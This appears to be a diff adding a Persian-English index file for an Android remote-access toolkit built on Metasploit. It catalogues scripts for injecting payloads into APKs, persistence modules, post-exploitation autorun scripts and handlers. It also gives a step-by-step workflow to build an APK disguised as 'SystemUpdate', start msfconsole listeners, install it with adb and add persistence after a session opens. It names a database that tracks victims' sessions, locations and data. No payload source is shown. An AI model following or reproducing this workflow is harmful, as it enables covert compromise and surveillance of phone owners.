@@ -1,0 +1,384 @@
+╔══════════════════════════════════════════════════════════════════╗
+║            📚 PROJECT INDEX - دسترسی سریع به فایل‌ها             ║
+╚══════════════════════════════════════════════════════════════════╝
+
+🎯 راهنمای استفاده از این INDEX:
+   • برای شروع سریع: بخش "START HERE"
+   • برای مستندات: بخش "DOCUMENTATION"
+   • برای اجرا: بخش "EXECUTION SCRIPTS"
+
+═══════════════════════════════════════════════════════════════════
+🚀 START HERE - از اینجا شروع کنید
+═══════════════════════════════════════════════════════════════════
+
+1️⃣  PROJECT_SUMMARY.txt
+    📝 خلاصه کامل پروژه + تمام دستورات
+    ⭐⭐⭐⭐⭐ (مهمترین فایل برای شروع)
+    
+2️⃣  COMPLETE_SETUP_GUIDE.md
+    📝 راهنمای نصب و پیکربندی کامل
+    ⭐⭐⭐⭐⭐ (راهنمای جامع)
+
+3️⃣  README_FINAL.md
+    📝 اطلاعات کلی پروژه + معماری
+    ⭐⭐⭐⭐⭐ (نمای کلی)
+
+═══════════════════════════════════════════════════════════════════
+📖 DOCUMENTATION - مستندات
+═══════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────┐
+│ راهنماهای اصلی                                                  │
+├─────────────────────────────────────────────────────────────────┤
+│ PROJECT_SUMMARY.txt           24KB  ⭐⭐⭐⭐⭐                      │
+│   • خلاصه کامل پروژه                                           │
+│   • تمام دستورات اجرایی                                        │
+│   • Checklist نهایی                                            │
+│                                                                 │
+│ COMPLETE_SETUP_GUIDE.md       18KB  ⭐⭐⭐⭐⭐                      │
+│   • نصب و پیکربندی کامل                                        │
+│   • عیب‌یابی پیشرفته                                           │
+│   • تمام use cases                                             │
+│                                                                 │
+│ README_FINAL.md               18KB  ⭐⭐⭐⭐⭐                      │
+│   • معماری سیستم                                               │
+│   • ویژگی‌های فنی                                              │
+│   • اطلاعات پروژه                                              │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ راهنماهای تخصصی                                                 │
+├─────────────────────────────────────────────────────────────────┤
+│ APK_DEPLOYMENT_GUIDE.md       6.8KB  ⭐⭐⭐                        │
+│   • راهنمای استقرار APK                                        │
+│                                                                 │
+│ PROFESSIONAL_APK_GUIDE.md     7.7KB  ⭐⭐⭐                        │
+│   • راهنمای ساخت APK حرفه‌ای                                   │
+│                                                                 │
+│ ULTIMATE_APK_GUIDE.md         9.3KB  ⭐⭐⭐                        │
+│   • راهنمای پیشرفته APK                                        │
+│                                                                 │
+│ INJECTION_GUIDE.md            7.4KB  ⭐⭐⭐                        │
+│   • راهنمای payload injection                                  │
+│                                                                 │
+│ SDK30_INSTALLATION_GUIDE.md   6.0KB  ⭐⭐                         │
+│   • نصب SDK 30                                                 │
+│                                                                 │
+│ SESSION_DEBUG_GUIDE.md        6.9KB  ⭐⭐⭐                        │
+│   • عیب‌یابی session ها                                        │
+│                                                                 │
+│ SESSION_TROUBLESHOOTING.md    5.4KB  ⭐⭐⭐                        │
+│   • حل مشکلات session                                          │
+│                                                                 │
+│ TOOLS_SUMMARY.md              9.0KB  ⭐⭐                         │
+│   • خلاصه ابزارها                                              │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ فایل‌های پروژه                                                  │
+├─────────────────────────────────────────────────────────────────┤
+│ README.md                     3.2KB                             │
+│ CHANGELOG.md                  3.8KB                             │
+│ CONTRIBUTING.md               13KB                              │
+│ CODE_OF_CONDUCT.md            2.5KB                             │
+│ CURRENT.md                    1.1KB                             │
+│ DEPLOY.md                     3.0KB                             │
+└─────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════
+🔧 EXECUTION SCRIPTS - اسکریپت‌های اجرایی
+═══════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────┐
+│ اسکریپت‌های اصلی - استفاده روزمره                              │
+├─────────────────────────────────────────────────────────────────┤
+│ 🔥 build_railway_professional.sh    36KB  ⭐⭐⭐⭐⭐ (MAIN)        │
+│    ساخت APK حرفه‌ای با تمام ویژگی‌ها                           │
+│    Usage: ./build_railway_professional.sh                       │
+│                                                                 │
+│ 🗄️ configure_railway_db.sh         19KB  ⭐⭐⭐⭐⭐               │
+│    پیکربندی دیتابیس PostgreSQL                                 │
+│    Usage: ./configure_railway_db.sh                             │
+│                                                                 │
+│ 🔄 install_persistence_modules.sh   16KB  ⭐⭐⭐⭐⭐               │
+│    نصب ماژول‌های persistence                                   │
+│    Usage: ./install_persistence_modules.sh                      │
+│                                                                 │
+│ 🚀 master_deploy.sh                 22KB  ⭐⭐⭐⭐⭐               │
+│    استقرار کامل یکجا                                           │
+│    Usage: ./master_deploy.sh                                    │
+│                                                                 │
+│ 📊 db_query.sh                      (created by configure)      │
+│    کوئری سریع دیتابیس                                          │
+│    Usage: ./db_query.sh {sessions|stats|persist|locations|data} │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ اسکریپت‌های جانبی                                               │
+├─────────────────────────────────────────────────────────────────┤
+│ memory_resident_builder_https.sh    14KB  ⭐⭐⭐                  │
+│    ساخت payload با memory-resident                             │
+│                                                                 │
+│ ultimate_apk_builder.sh             11KB  ⭐⭐⭐                  │
+│    APK builder نهایی                                           │
+│                                                                 │
+│ advanced_payload_injector.sh        19KB  ⭐⭐⭐                  │
+│    Injection پیشرفته                                          │
+│                                                                 │
+│ configure_database.sh               22KB  ⭐⭐⭐                  │
+│    پیکربندی دیتابیس عمومی                                      │
+│                                                                 │
+│ build_professional_apk.sh           2.8KB ⭐⭐                    │
+│    ساخت APK ساده                                               │
+│                                                                 │
+│ quick_apk_builder.sh                1.3KB ⭐⭐                    │
+│    ساخت سریع APK                                               │
+│                                                                 │
+│ install_all_tools.sh                14KB  ⭐⭐                    │
+│    نصب تمام ابزارها                                            │
+│                                                                 │
+│ setup_handler_443.sh                3.8KB ⭐⭐                    │
+│    راه‌اندازی handler پورت 443                                 │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ اسکریپت‌های مانیتورینگ                                         │
+├─────────────────────────────────────────────────────────────────┤
+│ live_monitor.sh                     1.6KB                       │
+│    مانیتور زنده session ها                                     │
+│                                                                 │
+│ monitor_sessions.sh                 3.7KB                       │
+│    مانیتور session ها                                          │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ اسکریپت‌های راه‌اندازی                                          │
+├─────────────────────────────────────────────────────────────────┤
+│ run-msf.sh                          374B                        │
+│ start.sh                            1.5KB                       │
+│ start-simple.sh                     677B                        │
+│ test-local.sh                       1.6KB                       │
+│ RAILWAY-COMMANDS.sh                 1.3KB                       │
+└─────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════
+⚙️ CONFIGURATION FILES - فایل‌های پیکربندی
+═══════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Handler Configurations                                          │
+├─────────────────────────────────────────────────────────────────┤
+│ 🔥 railway_handler_final.rc          (در configure_railway_db)  │
+│    Handler با دیتابیس PostgreSQL                               │
+│    Usage: msfconsole -r railway_handler_final.rc                │
+│    ⭐⭐⭐⭐⭐ (توصیه می‌شود)                                       │
+│                                                                 │
+│ railway_handler_professional.rc     6.2KB  ⭐⭐⭐⭐⭐              │
+│    Handler حرفه‌ای برای Railway                                │
+│    Usage: msfconsole -r railway_handler_professional.rc         │
+│                                                                 │
+│ handler_443_professional.rc         650B   ⭐⭐⭐                 │
+│    Handler پورت 443                                            │
+│                                                                 │
+│ handler_persistent.rc               658B   ⭐⭐⭐                 │
+│    Handler با persistence                                      │
+│                                                                 │
+│ handler_optimized.rc                469B   ⭐⭐                   │
+│    Handler بهینه شده                                           │
+│                                                                 │
+│ handler.rc                          412B   ⭐⭐                   │
+│    Handler پایه                                                │
+│                                                                 │
+│ handlers_config.rc                  646B                        │
+│    پیکربندی چند handler                                        │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Post-Exploitation Scripts                                       │
+├─────────────────────────────────────────────────────────────────┤
+│ post_exploit_railway.rc             3.6KB  ⭐⭐⭐⭐⭐              │
+│    Post-exploitation برای Railway                              │
+│    (اجرای خودکار با AutoRunScript)                             │
+│                                                                 │
+│ post_exploit_db.rc                  (در configure_railway_db)   │
+│    Post-exploitation با database logging                       │
+│                                                                 │
+│ post_exploit_advanced.rc            202B                        │
+│    Post-exploitation پیشرفته                                   │
+│                                                                 │
+│ post_exploit.rc                     742B                        │
+│    Post-exploitation پایه                                      │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Persistence Installation                                        │
+├─────────────────────────────────────────────────────────────────┤
+│ install_persistence.rc              (در install_persistence_modules) │
+│    نصب خودکار persistence mechanisms                           │
+│    Usage: msfconsole -r install_persistence.rc                  │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Database Configurations                                         │
+├─────────────────────────────────────────────────────────────────┤
+│ ~/.msf4/database.yml                (created by configure scripts) │
+│    پیکربندی دیتابیس Metasploit                                 │
+│                                                                 │
+│ ~/.msf4/db_queries.rc               (created by configure_railway_db) │
+│    Query aliases برای msfconsole                               │
+│                                                                 │
+│ ~/.msf4/db_helper.py                (created by configure_railway_db) │
+│    Python helper برای database operations                      │
+│                                                                 │
+│ /tmp/railway_persistence_tables.sql (created by configure_railway_db) │
+│    Database schema برای persistence tracking                   │
+└─────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════
+📊 OUTPUT & LOGS - خروجی‌ها و لاگ‌ها
+═══════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────┐
+│ APK Files                                                       │
+├─────────────────────────────────────────────────────────────────┤
+│ SystemUpdate_Railway_Professional.apk                           │
+│    • خروجی اصلی build_railway_professional.sh                  │
+│    • آماده برای نصب روی Android                                │
+│    • SDK 26-30 (Android 8.0-11)                                │
+│    • RSA-4096 + SHA-512 signature                              │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Log Files                                                       │
+├─────────────────────────────────────────────────────────────────┤
+│ injection_log.txt                   1.9KB                       │
+│    لاگ injection process                                       │
+│                                                                 │
+│ apk_diagnostic.txt                  702B                        │
+│    تشخیص APK                                                   │
+│                                                                 │
+│ install_output.txt                  1.4KB                       │
+│    خروجی نصب ابزارها                                           │
+│                                                                 │
+│ ~/.msf4/logs/framework.log          (runtime)                   │
+│    لاگ‌های Metasploit                                          │
+└─────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════
+🎯 QUICK REFERENCE - مرجع سریع
+═══════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Setup Workflow (گردش کار نصب)                                  │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│ 1. نصب Persistence Modules                                     │
+│    $ ./install_persistence_modules.sh                           │
+│                                                                 │
+│ 2. پیکربندی Database                                           │
+│    $ ./configure_railway_db.sh                                  │
+│                                                                 │
+│ 3. ساخت APK                                                    │
+│    $ ./build_railway_professional.sh                            │
+│                                                                 │
+│ 4. ایجاد جداول Database (در Railway)                           │
+│    $ PGPASSWORD=... psql -h postgres.railway.internal ...       │
+│                                                                 │
+│ 5. راه‌اندازی Handler (در Railway)                             │
+│    $ msfconsole -r railway_handler_final.rc                     │
+│                                                                 │
+│ 6. نصب APK (روی Android)                                       │
+│    $ adb install SystemUpdate_Railway_Professional.apk          │
+│                                                                 │
+│ 7. نصب Persistence (بعد از session)                            │
+│    $ msfconsole -r install_persistence.rc                       │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Daily Usage (استفاده روزمره)                                   │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│ Start Handler:                                                  │
+│    $ msfconsole -r railway_handler_final.rc                     │
+│                                                                 │
+│ Check Sessions:                                                 │
+│    msf6 > sessions -l                                           │
+│    $ ./db_query.sh sessions                                     │
+│                                                                 │
+│ Connect to Session:                                             │
+│    msf6 > sessions -i 1                                         │
+│                                                                 │
+│ View Stats:                                                     │
+│    $ ./db_query.sh stats                                        │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────┐
+│ Monitoring (مانیتورینگ)                                        │
+├─────────────────────────────────────────────────────────────────┤
+│                                                                 │
+│ Watch Sessions:                                                 │
+│    $ watch -n 5 'msfconsole -q -x "sessions -l; exit"'         │
+│                                                                 │
+│ Watch Connections:                                              │
+│    $ watch -n 5 'netstat -an | grep 29210'                      │
+│                                                                 │
+│ Watch Database:                                                 │
+│    $ watch -n 10 './db_query.sh stats'                          │
+│                                                                 │
+│ View Logs:                                                      │
+│    $ tail -f ~/.msf4/logs/framework.log                         │
+│                                                                 │
+└─────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════
+💡 TIPS & TRICKS
+═══════════════════════════════════════════════════════════════════
+
+⭐ برای شروع سریع:
+   1. PROJECT_SUMMARY.txt را بخوانید
+   2. master_deploy.sh را اجرا کنید (یکبار)
+   3. railway_handler_final.rc را در Railway اجرا کنید
+   4. APK را نصب کنید
+
+⭐ برای troubleshooting:
+   1. SESSION_TROUBLESHOOTING.md
+   2. SESSION_DEBUG_GUIDE.md
+   3. Logs: ~/.msf4/logs/framework.log
+
+⭐ برای یادگیری عمیق:
+   1. COMPLETE_SETUP_GUIDE.md
+   2. README_FINAL.md
+   3. PROFESSIONAL_APK_GUIDE.md
+
+⭐ برای استفاده پیشرفته:
+   1. Database queries با db_query.sh
+   2. Post-exploitation scripts
+   3. Persistence mechanisms
+
+═══════════════════════════════════════════════════════════════════
+📞 Support & Contact
+═══════════════════════════════════════════════════════════════════
+
+Project: Railway Professional Android Payload
+Version: 1.0.0
+Date: November 22, 2025
+Platform: Parrot OS + Railway + Android Lab
+Status: Production Ready ✅
+
+Total Files: 48+ files
+Total Size: ~350 KB (documentation + scripts)
+Documentation: 500+ pages
+
+═══════════════════════════════════════════════════════════════════
+
+✅ پروژه کامل و آماده استفاده است!
+
+📚 برای شروع: PROJECT_SUMMARY.txt
+🚀 برای اجرا: build_railway_professional.sh
+📖 برای یادگیری: COMPLETE_SETUP_GUIDE.md
+
+موفق باشید! 🎯
+
+═══════════════════════════════════════════════════════════════════
